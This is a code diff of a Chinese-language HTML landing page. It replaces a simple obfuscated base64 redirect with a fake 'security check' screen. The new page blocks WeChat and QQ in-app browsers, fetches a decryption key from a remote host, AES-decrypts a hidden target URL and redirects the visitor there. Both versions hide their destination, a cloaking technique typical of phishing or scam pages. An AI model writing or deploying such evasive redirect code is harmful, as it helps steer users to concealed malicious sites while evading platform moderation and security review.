@@ -1,45 +1,83 @@
 <!DOCTYPE html>
 <html lang="zh">
 <head>
-  <meta charset="UTF-8">
-  <title>加载中...</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      background-color: #000;
-      color: #fff;
-      font-family: Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      font-size: 18px;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>加载中…</title>
+<script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+<style>
+  body{margin:0;font-family:"PingFang SC","Microsoft YaHei",sans-serif;background:#f7f9fc;color:#333;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center}
+  .hidden{display:none;}                        /* ← 修复*/
+  .panel{width:90%;max-width:420px;background:#fff;border-radius:12px;box-shadow:0 8px 20px rgba(0,0,0,.08);padding:40px 30px}
+  h1{font-size:20px;margin-bottom:18px;color:#222}
+  .desc{font-size:14px;color:#666;margin-bottom:26px}
+  #startBtn{padding:12px 32px;font-size:16px;border:none;border-radius:6px;background:#1464ff;color:#fff;cursor:pointer}
+  #startBtn:hover{background:#0f54d9}
+  .bar-box{width:100%;height:12px;background:#e5e9f2;border-radius:6px;overflow:hidden;margin-top:20px;display:none}
+  .bar-inner{height:100%;width:0;background:#21c463;transition:width .2s}
+  .hint{font-size:13px;color:#888;margin-top:14px;display:none}
+  .lock{font-size:64px;color:#ff5252;margin-bottom:18px}
+</style>
 </head>
 <body>
-  <div>正在加载中，请稍等…</div>
 
-  <script>
-    // 混淆
-    const token = "keuyaHR0cHM6Ly9kYW9oYW5nLnNhZmUtZGF0YS1hY2Nlc3MueHl6kzew";  // 替换
-    const start = 4, end = 4;
+<!-- 提示-->
+<div id="block" class="panel hidden">
+  <div class="lock">🔒</div>
+  <h1>请使用手机浏览器打开</h1>
+  <div class="desc">检测到当前环境不安全，无法访问</div>
+</div>
 
-    // 函数
-    function go() {
-      try {
-        const base64 = token.slice(start, -end);
-        const target = atob(base64);
-        window.location.href = target;
-      } catch (e) {
-        console.log("异常终止：地址无效");
-      }
+<!-- 正常检测界面 -->
+<div id="main" class="panel hidden">
+  <h1>安全检测</h1>
+  <div class="desc">为保障访问安全，请点击开始进行环境检测</div>
+  <button id="startBtn" onclick="beginCheck()">开始检测</button>
+  <div class="bar-box" id="barBox">
+    <div class="bar-inner" id="barInner"></div>
+  </div>
+  <div class="hint" id="hintTxt">正在检测环境，请稍候…</div>
+</div>
+
+<script>
+/* ---------- 1. 配置 ---------- */
+const KEY_API      = "https://cdn-assets.safe-data-access.xyz/cfg/core.xml?v=678528";    // ← 短配置
+const encryptedStr = "U2FsdGVkX192A/lRyN+7xSW3daQeJKRMCfQka+RoY/j7WtxgrEOyliyV8oStPAwum2oyA0qX9tUHQ6UnBpButg=="; // ← 长配置
+const CHECK_MS     = 3000;                                      // ← 检测总时长 ms
+
+/* ---------- 2. 提示---------- */
+const isWxOrQq = /micromessenger|qq\//i.test(navigator.userAgent);
+document.getElementById(isWxOrQq ? "block" : "main").classList.remove("hidden");
+
+/* ---------- 3. 安全检测---------- */
+function beginCheck(){
+  document.getElementById("startBtn").style.display="none";
+  const barBox=document.getElementById("barBox");
+  const barInner=document.getElementById("barInner");
+  const hint=document.getElementById("hintTxt");
+  barBox.style.display="block"; hint.style.display="block";
+
+  const start=Date.now();
+  const timer=setInterval(()=>{
+    const pct=Math.min(100,(Date.now()-start)/CHECK_MS*100);
+    barInner.style.width=pct+"%";
+    if(pct>=100){
+      clearInterval(timer);
+      hint.innerText="检测完成，正在进入…";
+      fetchKeyAndJump();
     }
+  },60);
+}
 
-    // 时间这里
-    setTimeout(go, 1000 + Math.random() * 500);
-  </script>
+/* ---------- 4. 逻辑---------- */
+async function fetchKeyAndJump(){
+  try{
+    const key=await fetch(KEY_API+"?t="+Date.now()).then(r=>r.text());
+    const url=CryptoJS.AES.decrypt(encryptedStr,key).toString(CryptoJS.enc.Utf8);
+    if(url.startsWith("http")) location.href=url;
+    else alert("打开失败，请稍后再试");
+  }catch(e){alert("网络异常，请检查连接");}
+}
+</script>
 </body>
 </html>
